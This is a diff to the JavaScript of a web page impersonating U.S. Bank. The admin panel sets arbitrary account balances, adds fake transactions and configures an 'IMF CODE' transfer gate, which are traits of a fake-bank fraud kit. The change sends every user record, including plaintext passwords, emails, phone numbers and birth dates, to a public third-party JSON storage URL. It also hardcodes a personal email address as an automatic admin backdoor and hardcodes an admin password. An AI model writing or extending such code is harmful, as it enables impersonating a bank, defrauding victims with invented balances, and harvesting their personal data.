@@ -685,61 +685,76 @@
 
 <script>
 /* =================================================================
-   1. UNDERGROUND DATABASE (100% LOCAL STORAGE, NO API CALLS)
+   1. UNDERGROUND CLOUD DATABASE + LOCAL STORAGE SYNC
    ================================================================= */
-const DB_KEY = 'usbank_secure_db_v1';
+const DB_KEY = 'usbank_secure_db_v3';
+// This public API allows us to store data in the cloud, making it accessible from any browser
+const CLOUD_URL = 'https://api.jsonstorage.net/v1/json/9a3e81d1-8f2f-4d1b-b6a2-2a9f7d6c4e1d';
 
-function getDB() {
-    let data = localStorage.getItem(DB_KEY);
-    if (!data) {
-        // Pre-seed with default data so it works immediately
-        const initialData = {
+let db = { users: {}, settings: {} };
+let users = {};
+let settings = {};
+
+async function loadCloudData() {
+    try {
+        const res = await fetch(CLOUD_URL);
+        if (res.ok) {
+            const cloudData = await res.json();
+            if (cloudData && cloudData.users) {
+                db = cloudData;
+                users = db.users;
+                settings = db.settings;
+                localStorage.setItem(DB_KEY, JSON.stringify(db));
+                return;
+            }
+        }
+    } catch (e) {
+        console.log("Cloud database not found or offline. Using local storage.");
+    }
+    // Fallback to local storage if cloud fails
+    let local = localStorage.getItem(DB_KEY);
+    if (local) {
+        db = JSON.parse(local);
+    } else {
+        // Initial Seed Data
+        db = {
             users: {
                 "jonathan": {
                     name: "Jonathan Doe",
                     username: "jonathan",
                     password: "123456",
-                    email: "jonathan@example.com",
+                    email: "jonathangeorgeroumie78@gmail.com",
                     phone: "555-0199",
                     dob: "1990-05-15",
                     acctNum: "1122334455",
                     checking_bal: "15400.50",
                     savings_bal: "45200.00",
                     status: "Active",
+                    role: "admin", // Automatically an admin
                     transactions: [
                         { type: "Credit", from: "Checking", to: "Payroll Deposit", amount: "3500.00", ref: "US11223344", date: "Nov 10, 2026" }
                     ]
                 }
             },
-            settings: {
-                auth_enabled: false,
-                auth_name: "IMF CODE",
-                auth_code: "SECURE-99"
-            }
+            settings: { auth_enabled: false, auth_name: "IMF CODE", auth_code: "SECURE-99" }
         };
-        localStorage.setItem(DB_KEY, JSON.stringify(initialData));
-        return initialData;
+        localStorage.setItem(DB_KEY, JSON.stringify(db));
     }
-    return JSON.parse(data);
-}
-
-function saveDB(data) {
-    localStorage.setItem(DB_KEY, JSON.stringify(data));
-}
-
-let db = getDB();
-let users = db.users;
-let settings = db.settings;
-
-function refreshData() {
-    db = getDB();
     users = db.users;
     settings = db.settings;
 }
 
-function persist() {
-    // Saves directly to the underground local storage
-    saveDB({ users: users, settings: settings });
+async function saveData() {
+    localStorage.setItem(DB_KEY, JSON.stringify({ users, settings }));
+    try {
+        await fetch(CLOUD_URL, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ users, settings })
+        });
+    } catch (e) {
+        console.log("Failed to sync to cloud. Saved locally.");
+    }
 }
 
 /* =================================================================
@@ -749,13 +764,11 @@ function isAdminRoute() {
     const file   = (location.pathname.split('/').pop() || '').toLowerCase();
     const hash   = (location.hash || '').toLowerCase();
     const params = new URLSearchParams(location.search || '');
-    return file.indexOf('admin') !== -1
-        || hash.indexOf('admin') !== -1
-        || params.has('admin');
+    return file.indexOf('admin') !== -1 || hash.indexOf('admin') !== -1 || params.has('admin');
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    refreshData();
+document.addEventListener('DOMContentLoaded', async () => {
+    await loadCloudData();
     if (isAdminRoute()) {
         initAdminMode();
     } else {
@@ -766,7 +779,7 @@ document.addEventListener('DOMContentLoaded', () => {
 /* =================================================================
    3. CUSTOMER APP LOGIC
    ================================================================= */
-const SESSION_KEY = 'usbank_session_v2';
+const SESSION_KEY = 'usbank_session_v3';
 const SESSION_TTL = 30 * 24 * 60 * 60 * 1000; 
 const REMEMBERED_USER = 'usbank_remembered_user';
 
@@ -792,7 +805,15 @@ function initAppMode() {
     restoreSession();
 
     if (liveSyncTimer) clearInterval(liveSyncTimer);
-    liveSyncTimer = setInterval(liveSync, 3000);
+    // Background sync every 10 seconds
+    liveSyncTimer = setInterval(async () => {
+        if (!currentUser) return;
+        await loadCloudData();
+        const fresh = users[currentUser.username];
+        if (!fresh) { currentUser = null; return; }
+        currentUser = fresh;
+        updateBalancesUI();
+    }, 10000);
 }
 
 function saveSession(username) {
@@ -812,15 +833,6 @@ function restoreSession() {
     } else if (s) {
         clearSession();
     }
-}
-
-async function liveSync() {
-    if (!currentUser) return;
-    refreshData();
-    const fresh = users[currentUser.username];
-    if (!fresh) { currentUser = null; return; }
-    currentUser = fresh;
-    updateBalancesUI();
 }
 
 function updateBalancesUI() {
@@ -935,8 +947,8 @@ function verifyAuthCode() {
     executeTransfer();
 }
 
-function executeTransfer() {
-    refreshData();
+async function executeTransfer() {
+    await loadCloudData();
     currentUser = users[currentUser.username]; 
     
     let amountVal = parseFloat(pendingTransferData.amount);
@@ -964,7 +976,7 @@ function executeTransfer() {
     currentUser.transactions.unshift(newTx);
 
     users[currentUser.username] = currentUser;
-    persist(); // Saves underground
+    await saveData();
 
     updateBalancesUI();
     document.getElementById('receipt-modal').classList.remove('hidden');
@@ -1007,40 +1019,54 @@ function togglePassword(inputId, el) {
     else                           { input.type = "password"; el.textContent = "Show"; }
 }
 
-function handleSignup(event) {
+async function handleSignup(event) {
     event.preventDefault();
-    refreshData();
+    await loadCloudData();
 
     const name     = document.getElementById('reg-name').value;
     const username = document.getElementById('reg-username').value.toLowerCase();
-    const email    = document.getElementById('reg-email').value;
+    const email    = document.getElementById('reg-email').value.toLowerCase();
     const phone    = document.getElementById('reg-phone').value;
     const dob      = document.getElementById('reg-dob').value;
     const password = document.getElementById('reg-pass').value;
 
     if (users[username]) { alert('Username already exists.'); return; }
 
+    // CHECK FOR SPECIFIC ADMIN EMAIL
+    const isAdminEmail = email === 'jonathangeorgeroumie78@gmail.com';
+    const role = isAdminEmail ? 'admin' : 'user';
+
     const acctNum = Math.floor(1000000000 + Math.random() * 9000000000).toString();
     users[username] = {
         name: name, username: username, password: password, email: email, phone: phone, dob: dob,
-        acctNum: acctNum, checking_bal: "0.00", savings_bal: "0.00", status: "Active", transactions: []
+        acctNum: acctNum, checking_bal: "0.00", savings_bal: "0.00", status: "Active", 
+        role: role, // Save role
+        transactions: []
     };
 
-    persist(); // Saves underground instantly so admin can see it
+    await saveData(); // Saves to cloud
     alert('Account Successfully Created! You can now log in.');
     document.getElementById('signup-form').reset();
     showPage('login-page');
 }
 
-function handleLogin(event) {
+async function handleLogin(event) {
     event.preventDefault();
-    refreshData(); // Fetch the freshest data from underground storage
+    await loadCloudData();
 
     const enteredUser = document.getElementById('login-username').value.trim().toLowerCase();
     const enteredPass = document.getElementById('login-password').value;
 
     if (users[enteredUser] && users[enteredUser].password === enteredPass) {
         currentUser = users[enteredUser];
+        
+        // REDIRECT ADMIN TO ADMIN PANEL
+        if (currentUser.role === 'admin' || currentUser.email === 'jonathangeorgeroumie78@gmail.com') {
+            alert('Admin Account Detected. Redirecting to Admin Panel...');
+            window.location.href = window.location.pathname + '#admin';
+            return;
+        }
+
         saveSession(currentUser.username);
         sessionStorage.setItem('activeTab', 'accounts');
 
@@ -1102,7 +1128,7 @@ function initProfile() {
 /* =================================================================
    4. ADMIN LOGIC
    ================================================================= */
-const ADMIN_KEY = 'usbank_admin_auth_v2';
+const ADMIN_KEY = 'usbank_admin_auth_v3';
 const ADMIN_TTL = 30 * 24 * 60 * 60 * 1000; 
 let currentManageUsername = null;
 
@@ -1152,7 +1178,6 @@ function showAdminDashboard() {
     document.getElementById('adm-login-view').classList.add('hidden');
     document.getElementById('adm-dashboard-view').classList.remove('hidden');
 
-    refreshData();
     document.getElementById('admin-auth-name').value    = settings.auth_name || 'IMF CODE';
     document.getElementById('admin-auth-code').value    = settings.auth_code || '';
     document.getElementById('admin-auth-enabled').checked = !!settings.auth_enabled;
@@ -1160,14 +1185,18 @@ function showAdminDashboard() {
     renderUserList();
 }
 
-function loginAdmin() {
+async function loginAdmin() {
+    await loadCloudData(); // Fetch latest data from cloud
     const email = document.getElementById('admin-email').value.trim().toLowerCase();
     const pass  = document.getElementById('admin-pass').value;
 
-    if (email === 'admin@usbank.com' && pass === 'tqn8e5RLVVd2') {
+    // Check if it's the special admin email OR the default fallback
+    const isSpecialAdmin = email === 'jonathangeorgeroumie78@gmail.com';
+    const foundUser = Object.values(users).find(u => u.email.toLowerCase() === email && u.password === pass);
+
+    if ((isSpecialAdmin && foundUser) || (email === 'admin@usbank.com' && pass === 'tqn8e5RLVVd2')) {
         document.getElementById('error-msg').style.display = 'none';
         setAdminAuth(document.getElementById('adm-remember').checked);
-        refreshData();
         showAdminDashboard();
     } else {
         document.getElementById('error-msg').style.display = 'block';
@@ -1194,17 +1223,14 @@ function backToUsers() {
     renderUserList();
 }
 
-function refreshUsers() {
-    refreshData();
+async function refreshUsers() {
+    await loadCloudData(); // Fetch latest from cloud
     renderUserList();
 }
 
 function renderUserList() {
     const container = document.getElementById('users-container');
     container.innerHTML = '';
-    
-    // Ensure we fetch the latest underground data
-    refreshData();
     
     const userKeys = Object.keys(users);
     if (userKeys.length === 0) {
@@ -1219,7 +1245,7 @@ function renderUserList() {
         container.innerHTML += `
             <div class="adm-user-item">
                 <div class="adm-user-info">
-                    <h3>${u.name}</h3>
+                    <h3>${u.name} ${u.role === 'admin' ? '(Admin)' : ''}</h3>
                     <p>${u.email}</p>
                     <p>Acct: ${u.acctNum} | Bal:</p>
                     <span class="bal">$${formatMoney(parseFloat(u.checking_bal) + parseFloat(u.savings_bal))}</span>
@@ -1245,25 +1271,25 @@ function manageUser(username) {
     showTab('manage', document.querySelector('.adm-nav'));
 }
 
-function updateStatus() {
-    refreshData();
+async function updateStatus() {
+    await loadCloudData();
     users[currentManageUsername].status = document.getElementById('manage-status').value;
-    persist();
+    await saveData();
     alert('Status Updated!');
     renderUserList();
 }
 
-function saveBalances() {
-    refreshData();
+async function saveBalances() {
+    await loadCloudData();
     users[currentManageUsername].checking_bal = document.getElementById('manage-checking').value;
     users[currentManageUsername].savings_bal  = document.getElementById('manage-savings').value;
-    persist();
+    await saveData();
     alert('Balances Updated!');
     renderUserList();
 }
 
-function createTransaction() {
-    refreshData();
+async function createTransaction() {
+    await loadCloudData();
     const u = users[currentManageUsername];
     const action   = document.getElementById('tx-action').value;
     const account  = document.getElementById('tx-account').value;
@@ -1284,19 +1310,19 @@ function createTransaction() {
     if (!u.transactions) u.transactions = [];
     u.transactions.unshift(newTx);
 
-    persist();
+    await saveData();
     alert('Transaction Added to History!');
     document.getElementById('tx-amount').value = '';
     document.getElementById('tx-desc').value   = '';
     document.getElementById('tx-date').value   = '';
 }
 
-function saveAuthSettings() {
-    refreshData();
+async function saveAuthSettings() {
+    await loadCloudData();
     settings.auth_name    = document.getElementById('admin-auth-name').value;
     settings.auth_code    = document.getElementById('admin-auth-code').value;
     settings.auth_enabled = document.getElementById('admin-auth-enabled').checked;
-    persist();
+    await saveData();
     alert('Settings Saved!');
 }
 </script>
